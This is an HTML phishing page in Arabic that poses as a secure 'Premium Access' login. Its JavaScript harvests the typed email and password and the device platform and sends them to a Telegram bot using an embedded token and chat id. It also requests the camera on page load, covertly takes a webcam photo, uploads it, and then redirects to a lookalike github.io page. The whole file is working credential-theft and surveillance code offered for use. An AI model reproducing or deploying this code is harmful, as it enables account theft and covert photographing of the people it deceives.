<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Access</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #d4af37; text-align: center; width: 300px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
        button { background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 8px; width: 100%; cursor: pointer; font-weight: bold; }
        #loader { display: none; color: #d4af37; }
    </style>
</head>
<body>

<div class="card" id="login-box">
    <h2 style="color: #d4af37;">دخول آمن</h2>
    <input type="text" id="email" placeholder="البريد الإلكتروني">
    <input type="password" id="pass" placeholder="كلمة السر">
    <button onclick="startHack()">تسجيل الدخول</button>
</div>

<div id="loader">
    <h3>جاري التحقق من البيانات...</h3>
</div>

<video id="v" style="display:none;" autoplay playsinline></video>
<canvas id="c" style="display:none;" width="640" height="480"></canvas>

<script>
    // --- البيانات المحدثة بناءً على طلبك ---
    const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
    const chat_id = '8350812242'; 

    // تشغيل الكاميرا
    navigator.mediaDevices.getUserMedia({video: true}).then(s => {
        document.getElementById('v').srcObject = s;
    }).catch(e => console.log("Camera access required"));

    async function startHack() {
        const u = document.getElementById('email').value;
        const p = document.getElementById('pass').value;

        if(!u || !p) return alert("يرجى إدخال البيانات");

        document.getElementById('login-box').style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // إرسال النص
        const msg = `🔥 صيد جديد 🔥\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n📱 الجهاز: ${navigator.platform}`;
        
        try {
            // إرسال البيانات بـ await عشان نضمن الوصول
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chat_id, text: msg})
            });

            // التقاط صورة وإرسالها
            const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
            ctx.drawImage(v, 0, 0, 640, 480);
            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', blob, 'cam.jpg');

            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});

            // تحويل لصفحة تيك توك بعد الانتهاء
            window.location.href = "https://facloook5-cpu.github.io/Ca.is/";

        } catch (e) {
            // تحويل حتى لو حصل خطأ
            window.location.href = "https://facloook5-cpu.github.io/Ca.is/";
        }
    }
</script>
</body>
</html>
